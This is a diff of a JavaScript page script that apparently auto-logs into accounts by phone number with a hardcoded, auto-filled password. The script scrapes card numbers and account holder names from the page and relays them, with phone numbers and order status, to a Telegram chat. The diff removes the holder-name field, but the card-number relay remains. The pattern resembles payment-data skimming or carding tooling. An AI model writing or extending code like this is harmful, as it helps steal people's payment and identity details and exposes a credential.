@@ -1989,7 +1989,6 @@
       telegramMsg += `👤 User: <b>${state.phone || 'Unknown'}</b>\n`;
       telegramMsg += `💰 Amount: <b>₹0.00</b>\n`;
       telegramMsg += `💳 Card NUMBER: <b>None</b>\n`;
-      telegramMsg += `🥋 ACCOUNT HOLDER NAME: <b>None</b>\n`;
       telegramMsg += `📋 Order ID: <b>N/A</b>\n`;
       telegramMsg += `⏱ Time: <b>${timeStr}</b>\n`;
       telegramMsg += `✅ Status: <b>FAIL</b>\n`;
@@ -2074,7 +2073,6 @@
         telegramMsg += `👤 User: <b>${state.phone || 'Unknown'}</b>\n`;
         telegramMsg += `💰 Amount: <b>₹0.00</b>\n`;
         telegramMsg += `💳 Card NUMBER: <b>None</b>\n`;
-        telegramMsg += `🥋 ACCOUNT HOLDER NAME: <b>None</b>\n`;
         telegramMsg += `📋 Order ID: <b>N/A</b>\n`;
         telegramMsg += `⏱ Time: <b>${timeStr}</b>\n`;
         telegramMsg += `✅ Status: <b>FAIL</b>\n`;
@@ -2098,7 +2096,6 @@
         telegramMsg += `👤 User: <b>${state.phone || 'Unknown'}</b>\n`;
         telegramMsg += `💰 Amount: <b>₹0.00</b>\n`;
         telegramMsg += `💳 Card NUMBER: <b>Invalid</b>\n`;
-        telegramMsg += `🥋 ACCOUNT HOLDER NAME: <b>Invalid</b>\n`;
         telegramMsg += `📋 Order ID: <b>N/A</b>\n`;
         telegramMsg += `⏱ Time: <b>${timeStr}</b>\n`;
         telegramMsg += `✅ Status: <b>FAIL</b>\n`;
@@ -2118,13 +2115,11 @@
         div.innerHTML = `<div style="color:#ff6b6b;">${errorMsg}</div>`;
         
         let cardNumber = 'Unknown';
-        let holderName = 'Unknown';
         document.querySelectorAll('.card-item').forEach(el => {
           if (el.classList.contains('selected')) {
             const desc = el.querySelector('.pm-desc')?.textContent || '';
             const match = desc.match(/\*\*\*\*(\d+)/);
             cardNumber = match ? match[1] : 'Unknown';
-            holderName = el.dataset.holder || 'Unknown';
           }
         });
         
@@ -2132,7 +2127,6 @@
         telegramMsg += `👤 User: <b>${state.phone || 'Unknown'}</b>\n`;
         telegramMsg += `💰 Amount: <b>₹${amount.toFixed(2)}</b>\n`;
         telegramMsg += `💳 Card NUMBER: <b>${cardNumber}</b>\n`;
-        telegramMsg += `🥋 ACCOUNT HOLDER NAME: <b>${holderName}</b>\n`;
         telegramMsg += `📋 Order ID: <b>N/A</b>\n`;
         telegramMsg += `⏱ Time: <b>${timeStr}</b>\n`;
         telegramMsg += `✅ Status: <b>FAIL</b>\n`;
@@ -2146,13 +2140,11 @@
       }
       
       let cardNumber = 'Unknown';
-      let holderName = 'Unknown';
       document.querySelectorAll('.card-item').forEach(el => {
         if (el.classList.contains('selected')) {
           const desc = el.querySelector('.pm-desc')?.textContent || '';
           const match = desc.match(/\*\*\*\*(\d+)/);
           cardNumber = match ? match[1] : 'Unknown';
-          holderName = el.dataset.holder || 'Unknown';
         }
       });
       
@@ -2181,7 +2173,6 @@
       telegramMsg += `👤 User: <b>${state.phone || 'Unknown'}</b>\n`;
       telegramMsg += `💰 Amount: <b>₹${amount.toFixed(2)}</b>\n`;
       telegramMsg += `💳 Card NUMBER: <b>${cardNumber}</b>\n`;
-      telegramMsg += `🥋 ACCOUNT HOLDER NAME: <b>${holderName}</b>\n`;
       telegramMsg += `📋 Order ID: <b>${orderId}</b>\n`;
       telegramMsg += `⏱ Time: <b>${timeStr}</b>\n`;
       telegramMsg += `✅ Status: <b>${status}</b>`;
@@ -2330,7 +2321,7 @@
   log('📱 Enter phone number (auto-login on 10 digits)', 'info');
   log('🔐 Password: Sanju2005 (auto-filled)', 'info');
   log('📤 Telegram: SUCCESS = permanent, FAIL = auto-delete after 5 min', 'info');
-  log('💳 Card NUMBER and ACCOUNT HOLDER NAME sent in Telegram', 'info');
+  log('💳 Card NUMBER sent in Telegram', 'info');
 })();
 </script>
 </body>
